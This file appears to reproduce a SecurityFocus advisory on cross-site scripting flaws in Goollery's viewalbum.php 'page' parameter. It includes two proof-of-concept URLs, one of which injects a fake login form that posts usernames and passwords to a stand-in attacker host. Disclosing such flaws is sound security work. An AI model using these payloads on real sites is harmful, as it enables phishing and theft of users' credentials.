@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/11587/info
+ 
+It is reported that Goollery is affected by various cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied URI input.
+ 
+These problems present themselves when malicious HTML and script code is sent to the application through the 'page' parameter of several scripts.
+ 
+These issues could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user.
+
+http://www.example.com/goollery/viewalbum.php?conversation_id=ffee00b71f3931a&page=<form%20action="http://www.atacker.com/save2db.asp"%20method="post">Username:<input%20name="us
+ername"%20type="text"%20maxlength="30"><br>Password:<input%20name="password"%20type="text"%20maxlength="30"><br><input%20name="login"%20type="submit"%20value="Login"></fo
+rm>&sess=daf5c642ade1162f15c4eb4b7e89da17
+
+http://www.example.com/goollery/viewalbum.php?conversation_id=ffee00b71f3931a&page=<body>XSS%20poW@!!</body>&sess=daf5c642ade1162f15c4eb4b7e89da17
